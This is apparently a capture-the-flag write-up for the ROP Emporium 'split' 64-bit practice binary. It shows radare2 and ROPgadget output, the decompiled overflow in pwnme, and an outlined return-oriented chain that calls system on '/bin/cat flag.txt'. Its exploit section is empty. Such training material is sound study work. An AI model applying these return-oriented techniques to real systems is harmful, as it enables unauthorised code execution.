# Day 2: ROP Emporium split (64bit)


## Information

```bash
x86_64 ➤ rabin2 -I split
arch     x86
baddr    0x400000
binsz    6805
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
x86_64 ➤


```

> The NX bit (no-execute) is a technology used in CPUs to segregate areas of memory for use by either storage of processor instructions (code) or for storage of data, a feature normally only found in Harvard architecture processors. However, the NX bit is being increasingly used in conventional von Neumann architecture processors, for security reasons.


## ROP 

```console
x86_64 ➤ ROPgadget --binary split
Gadgets information
============================================================
0x000000000040060e : adc byte ptr [rax], ah ; jmp rax
0x00000000004005d9 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x0000000000400597 : add al, 0 ; add byte ptr [rax], al ; jmp 0x400540
0x0000000000400577 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x400540
0x00000000004005df : add bl, dh ; ret
0x00000000004007cd : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004007cb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000400557 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x400540
0x00000000004006e2 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040068c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400620
0x00000000004007cc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040068d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400620
0x0000000000400559 : add byte ptr [rax], al ; jmp 0x400540
0x0000000000400616 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040068e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400620
0x00000000004005de : add byte ptr [rax], al ; ret
0x0000000000400615 : add byte ptr [rax], r8b ; pop rbp ; ret
0x00000000004005dd : add byte ptr [rax], r8b ; ret
0x000000000040068f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400620
0x0000000000400677 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400567 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x400540
0x0000000000400678 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x0000000000400587 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x400540
0x000000000040053b : add esp, 8 ; ret
0x000000000040053a : add rsp, 8 ; ret
0x00000000004005d8 : and byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000400554 : and byte ptr [rax], al ; push 0 ; jmp 0x400540
0x0000000000400564 : and byte ptr [rax], al ; push 1 ; jmp 0x400540
0x0000000000400574 : and byte ptr [rax], al ; push 2 ; jmp 0x400540
0x0000000000400584 : and byte ptr [rax], al ; push 3 ; jmp 0x400540
0x0000000000400594 : and byte ptr [rax], al ; push 4 ; jmp 0x400540
0x00000000004005a4 : and byte ptr [rax], al ; push 5 ; jmp 0x400540
0x0000000000400531 : and byte ptr [rax], al ; test rax, rax ; je 0x40053a ; call rax
0x000000000040074f : call qword ptr [rax + 0x2e66c35d]
0x0000000000400873 : call qword ptr [rax + 0x43000000]
0x000000000040073e : call qword ptr [rax + 0x4855c3c9]
0x000000000040096b : call qword ptr [rcx]
0x0000000000400538 : call rax
0x00000000004007ac : fmul qword ptr [rax - 0x7d] ; ret
0x00000000004005da : hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000400693 : in eax, 0x5d ; jmp 0x400620
0x0000000000400536 : je 0x40053a ; call rax
0x0000000000400609 : je 0x400618 ; pop rbp ; mov edi, 0x601078 ; jmp rax
0x000000000040064b : je 0x400658 ; pop rbp ; mov edi, 0x601078 ; jmp rax
0x000000000040055b : jmp 0x400540
0x0000000000400695 : jmp 0x400620
0x0000000000400293 : jmp 0xffffffffe249c97b
0x000000000040098b : jmp qword ptr [rbp]
0x0000000000400611 : jmp rax
0x0000000000400740 : leave ; ret
0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
0x0000000000400672 : mov byte ptr [rip + 0x200a07], 1 ; pop rbp ; ret
0x0000000000400572 : mov dl, 0xa ; and byte ptr [rax], al ; push 2 ; jmp 0x400540
0x00000000004006e1 : mov eax, 0 ; pop rbp ; ret
0x0000000000400692 : mov ebp, esp ; pop rbp ; jmp 0x400620
0x000000000040060c : mov edi, 0x601078 ; jmp rax
0x0000000000400562 : mov edx, 0x6800200a ; add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x400540
0x0000000000400691 : mov rbp, rsp ; pop rbp ; jmp 0x400620
0x0000000000400592 : movabs byte ptr [0x46800200a], al ; jmp 0x400540
0x000000000040073f : nop ; leave ; ret
0x0000000000400750 : nop ; pop rbp ; ret
0x0000000000400613 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004005db : nop dword ptr [rax + rax] ; ret
0x0000000000400655 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400675 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007c0 : pop r14 ; pop r15 ; ret
0x00000000004007c2 : pop r15 ; ret
0x0000000000400694 : pop rbp ; jmp 0x400620
0x000000000040060b : pop rbp ; mov edi, 0x601078 ; jmp rax
0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400618 : pop rbp ; ret
0x00000000004007c3 : pop rdi ; ret
0x00000000004007c1 : pop rsi ; pop r15 ; ret
0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400556 : push 0 ; jmp 0x400540
0x0000000000400566 : push 1 ; jmp 0x400540
0x0000000000400576 : push 2 ; jmp 0x400540
0x0000000000400586 : push 3 ; jmp 0x400540
0x0000000000400596 : push 4 ; jmp 0x400540
0x00000000004005a6 : push 5 ; jmp 0x400540
0x0000000000400690 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400620
0x000000000040053e : ret
0x0000000000400542 : ret 0x200a
0x0000000000400291 : retf 0xe99e
0x0000000000400292 : sahf ; jmp 0xffffffffe249c97b
0x0000000000400535 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
0x00000000004007d5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004007d4 : sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004007ca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400534 : test eax, eax ; je 0x40053a ; call rax
0x0000000000400533 : test rax, rax ; je 0x40053a ; call rax

Unique gadgets found: 95
x86_64 ➤


```


## radare2

```console

x86_64 ➤ r2 ./split
WARNING: No calling convention defined for this file, analysis may be inaccurate.
 -- Beer in mind.
[0x004005b0]> aaa
[Warning: set your favourite calling convention in `e anal.cc=?`
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x004005b0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt

[0x004005b0]> /a pop rdi, ret
Searching 1 byte in [0x601072-0x601088]
hits: 0
Searching 1 byte in [0x600e10-0x601072]
hits: 0
Searching 1 byte in [0x400000-0x4009e0]
hits: 12
Searching 1 byte in [0x100000-0x1f0000]
hits: 0
0x004003e9 hit0_0 5f
0x004003ea hit0_1 5f
0x004003ef hit0_2 5f
0x004003f5 hit0_3 5f
0x00400400 hit0_4 5f
0x00400407 hit0_5 5f
0x00400408 hit0_6 5f
0x0040040d hit0_7 5f
0x00400413 hit0_8 5f
0x00400414 hit0_9 5f
0x004007c3 hit0_10 5f
0x00400801 hit0_11 5f
[0x004005b0]> afl
0x004005b0    1 43           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   sym.__do_global_dtors_aux
0x00400690    1 7            entry.init0
0x004006e8    1 90           sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400742    1 17           sym.usefulFunction
0x00400560    1 6            sym.imp.system
0x004007d0    1 2            sym.__libc_csu_fini
0x004007d4    1 9            sym._fini
0x00400760    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
[0x004005b0]> pdf @ sym.usefulFunction
┌ 17: sym.usefulFunction ();
│           0x00400742      55             push rbp
│           0x00400743      4889e5         mov rbp, rsp
│           0x00400746      bf4a084000     mov edi, str._bin_ls        ; 0x40084a ; "/bin/ls"
│           0x0040074b      e810feffff     call sym.imp.system
│           0x00400750      90             nop
│           0x00400751      5d             pop rbp
└           0x00400752      c3             ret
[0x004005b0]>

```


### gadget

*`0x00400801`*

```console
x86_64 ➤ ROPgadget --binary split  --ropchain | grep "pop rdi ; ret"
0x00000000004007c3 : pop rdi ; ret
x86_64 ➤


```
## ROP chain for 32bits

| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
|---------|------|------|------|------|------|------|
| %eax  | %ebx | %ecx | %edx | %esi	| %edi	| %ebp |

_ROP chain_ = `offset_padding` + `system_addr` + `bin_cat_command`  


## ROP Chain for 64bit is:

  syscall	 arg0	  arg1	 arg2	  arg3	 arg4	  arg5
  %rax	 %rdi	  %rsi	 %rdx	  %rcx	 %r8	  %r9

_ROP chain_ = `offset_padding` + `pop_rdi_ret_gadget` + `bin_cat_command` + `system_addr`




## Exploit



----------------
----------------

# Second Method

```console
x86_64 ➤ r2 -d split
Process with PID 5538 started...
= attach 5538 5538
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- One does not simply write documentation.
[0x7fed1226f090]> aaa
[Warning: set your favourite calling convention in `e anal.cc=?`
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7fed1226f090]> afl
0x004005b0    1 43           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   sym.__do_global_dtors_aux
0x00400690    1 7            entry.init0
0x004006e8    1 90           sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400742    1 17           sym.usefulFunction
0x00400560    1 6            sym.imp.system
0x004007d0    1 2            sym.__libc_csu_fini
0x004007d4    1 9            sym._fini
0x00400760    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
[0x7fed1226f090]> s main
[0x00400697]> pdg


// WARNING: [r2ghidra] Matching calling convention reg of function main failed, args may be inaccurate.
// WARNING: [r2ghidra] Matching calling convention reg of function sym.imp.setvbuf failed, args may be inaccurate.
// WARNING: [r2ghidra] Matching calling convention reg of function sym.imp.puts failed, args may be inaccurate.
// WARNING: [r2ghidra] Matching calling convention reg of function sym.pwnme failed, args may be inaccurate.

undefined8 main(void)

{
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.puts("split by ROP Emporium");
    sym.imp.puts("x86_64\n");
    sym.pwnme();
    sym.imp.puts("\nExiting");
    return 0;
}
[0x00400697]>
[0x00400697]> s sym.pwnme
[0x004006e8]> pdg

// WARNING: [r2ghidra] Matching calling convention reg of function sym.pwnme failed, args may be inaccurate.
// WARNING: [r2ghidra] Matching calling convention reg of function sym.imp.memset failed, args may be inaccurate.
// WARNING: [r2ghidra] Matching calling convention reg of function sym.imp.puts failed, args may be inaccurate.
// WARNING: [r2ghidra] Matching calling convention reg of function sym.imp.printf failed, args may be inaccurate.
// WARNING: [r2ghidra] Matching calling convention reg of function sym.imp.read failed, args may be inaccurate.

void sym.pwnme(void)

{
    int64_t var_20h;

    sym.imp.memset(&var_20h, 0, 0x20);
    sym.imp.puts("Contriving a reason to ask user for data...");
    sym.imp.printf(0x40083c);
    sym.imp.read(0, &var_20h, 0x60);
    sym.imp.puts("Thank you!");
    return;
}
[0x004006e8]> s sym.usefulFunction
[0x00400742]> pdg

// WARNING: [r2ghidra] Matching calling convention reg of function sym.usefulFunction failed, args may be inaccurate.
// WARNING: [r2ghidra] Matching calling convention reg of function sym.imp.system failed, args may be inaccurate.

void sym.usefulFunction(void)

{
    sym.imp.system("/bin/ls");
    return;
}
[0x00400742]> q
Do you want to quit? (Y/n) y
Do you want to kill the process? (Y/n)
x86_64 ➤ rabin2 -z ./split
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
x86_64 ➤ ropper --file split | grep rdi
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x00000000004006d4: add byte ptr [rax], al; add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret;
0x00000000004006d6: add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret;
0x00000000004007c3: pop rdi; ret;
x86_64 ➤


```